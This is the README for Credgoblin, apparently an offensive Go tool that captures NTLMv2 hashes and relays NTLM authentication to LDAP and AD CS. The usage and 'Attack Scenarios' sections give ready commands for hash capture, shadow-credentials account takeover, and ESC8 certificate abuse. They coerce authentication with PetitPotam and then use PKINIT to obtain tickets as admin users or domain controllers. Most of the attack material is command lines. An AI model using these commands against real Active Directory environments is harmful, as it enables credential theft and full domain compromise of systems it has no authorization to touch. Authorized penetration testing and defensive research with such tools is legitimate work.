# Credgoblin

<p align="center">
  <img src="assets/credgoblin-logo.png" alt="Credgoblin Logo" width="400">
</p>

<p align="center">
  <strong>NTLM Hash Capture & Relay Tool</strong><br>
  A lightweight Go implementation for capturing NTLMv2 hashes and relaying authentication to LDAP/ADCS targets.
</p>

---

## Features

| Feature | Description |
|---------|-------------|
| **Hash Capture** | Capture NTLMv2 hashes from SMB connections (Hashcat `-m 5600` format) |
| **LDAP Relay** | Relay to LDAP/LDAPS for shadow credentials attacks |
| **ADCS Relay** | Relay to AD CS web enrollment for certificate requests |
| **Shadow Credentials** | Automatically add `msDS-KeyCredentialLink` for PKINIT authentication |
| **Cross-Protocol** | SMB-to-HTTP and HTTP-to-HTTP relay support |
| **SMB Server** | Full SMB1/SMB2 server with NTLM authentication |

## Installation

```bash
# Clone and build
git clone https://github.com/ineffectivecoder/credgoblin.git
cd credgoblin
go build -o credgoblin ./cmd/credgoblin

# Or install directly
go install github.com/ineffectivecoder/credgoblin/cmd/credgoblin@latest
```

### Requirements

- Go 1.21+
- Root/Administrator privileges (port 445 binding)

## Usage

### Capture Mode

Capture NTLMv2 hashes from incoming SMB connections:

```bash
# Basic capture
sudo ./credgoblin capture -i 0.0.0.0

# Capture with custom output file
sudo ./credgoblin capture -i 0.0.0.0 -o captured_hashes.txt

# Verbose output
sudo ./credgoblin capture -i 0.0.0.0 -v
```

Captured hashes are saved in Hashcat format (`-m 5600`):
```
username::DOMAIN:challenge:NTProofStr:blob
```

### Relay Mode - LDAP

Relay captured authentication to LDAP for shadow credentials attack:

```bash
# Relay to LDAP
sudo ./credgoblin relay -t ldap://dc.domain.local -u 'CN=TargetUser,CN=Users,DC=domain,DC=local'

# Relay to LDAPS
sudo ./credgoblin relay -t ldaps://dc.domain.local -u 'CN=TargetUser,CN=Users,DC=domain,DC=local'

# Custom PFX password
sudo ./credgoblin relay -t ldap://dc.domain.local -u 'CN=TargetUser,CN=Users,DC=domain,DC=local' -P 'MyPassword123'
```

On success, outputs a PFX certificate for PKINIT authentication:
```bash
# Use with PKINITtools
python gettgtpkinit.py -cert-pfx target.pfx -pfx-pass '<password>' domain.local/TargetUser
```

### Relay Mode - ADCS

Relay to AD Certificate Services for certificate enrollment:

```bash
# Relay to ADCS (HTTP)
sudo ./credgoblin relay -m adcs -t http://ca.domain.local/certsrv -T User

# Relay to ADCS (HTTPS)
sudo ./credgoblin relay -m adcs -t https://ca.domain.local/certsrv -T Machine

# Custom output path
sudo ./credgoblin relay -m adcs -t http://ca.domain.local/certsrv -T User -o admin.pfx
```

### Command Reference

```
credgoblin capture [OPTIONS]
  -i, --interface    IP address to listen on (default: 0.0.0.0)
  -o, --output       Output file for captured hashes (default: hashes.txt)
  -v, --verbose      Enable verbose output

credgoblin relay [OPTIONS]
  -t, --target       Target URL (ldap://, ldaps://, http://, https://)
  -m, --mode         Relay mode: ldap or adcs (default: ldap)
  -u, --target-user  Target user DN for shadow credentials (LDAP mode)
  -T, --template     Certificate template name (ADCS mode)
  -o, --output       Output path for PFX certificate
  -P, --pfx-pass     PFX password (random if not specified)
  -p, --ports        Listener ports: 80, 445, or both (default: both)
  -v, --verbose      Enable verbose output
```

## Attack Scenarios

### Scenario 1: Coerced Authentication to Shadow Credentials

```bash
# 1. Start relay targeting a user you want to compromise
sudo ./credgoblin relay -t ldap://dc.domain.local -u 'CN=AdminUser,CN=Users,DC=domain,DC=local'

# 2. Coerce authentication (e.g., PetitPotam, PrinterBug)
python PetitPotam.py <attacker-ip> <target-server>

# 3. Use the resulting PFX for PKINIT
python gettgtpkinit.py -cert-pfx AdminUser.pfx -pfx-pass '<pass>' domain.local/AdminUser
```

### Scenario 2: ADCS ESC8 (HTTP Enrollment)

```bash
# 1. Start ADCS relay
sudo ./credgoblin relay -m adcs -t http://ca.domain.local/certsrv -T User

# 2. Coerce machine authentication
python PetitPotam.py <attacker-ip> <dc-ip>

# 3. Use certificate for authentication
python gettgtpkinit.py -cert-pfx DC01_.pfx -pfx-pass '<pass>' domain.local/DC01$
```

## Technical Notes

### NTLM Relay Flow

```
Victim              Credgoblin              Target (LDAP/ADCS)
   │                    │                         │
   │── SMB NEGOTIATE ──>│                         │
   │<── NEGOTIATE ──────│                         │
   │── Type 1 ─────────>│── SICILY/HTTP Type 1 ──>│
   │                    │<── Type 2 ──────────────│
   │<── Type 2 ─────────│                         │
   │── Type 3 ─────────>│── SICILY/HTTP Type 3 ──>│
   │                    │<── SUCCESS ─────────────│
   │                    │── LDAP Modify / CSR ───>│
   │<── SUCCESS ────────│                         │
```

### LDAP SICILY Authentication

Credgoblin uses the SICILY (Security Integrated Connection over LDAP with Yielding) protocol for NTLM authentication over LDAP:

- **Discovery**: Empty SASL bind (tag 9) to enumerate supported mechanisms
- **Negotiate**: NTLM Type 1 in SASL credentials (tag 10)
- **Response**: NTLM Type 3 in sicilyResponse (tag 11)

### Shadow Credentials

The shadow credentials attack adds a `msDS-KeyCredentialLink` attribute to the target user, enabling certificate-based authentication via PKINIT. The generated PFX contains:

- RSA 2048-bit key pair
- Self-signed X.509 certificate with UPN SAN
- Compatible with Rubeus and PKINITtools

## Limitations

### Windows Server 2025

Microsoft has hardened NTLM relay protections in Server 2025:

- **LDAP Channel Binding**: Enabled by default
- **EPA**: Extended Protection for Authentication enforced
- **MIC Validation**: Strict enforcement regardless of negotiation

LDAP relay attacks against Server 2025 DCs are not viable with current techniques. Consider:
- Targeting older DCs (2016/2019/2022)
- Using ADCS relay (ESC8) which remains effective
- Alternative attack paths

### Signing Requirements

- SMB signing on the target will block relay attacks
- LDAP signing requirements may prevent relay depending on DC configuration

## Credits

Inspired by:
- [Impacket ntlmrelayx](https://github.com/fortra/impacket)
- [Responder](https://github.com/lgandx/Responder)
- [PKINITtools](https://github.com/dirkjanm/PKINITtools)

## License

MIT License - See [LICENSE](LICENSE) for details.

## Disclaimer

This tool is intended for authorized security testing and research purposes only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.
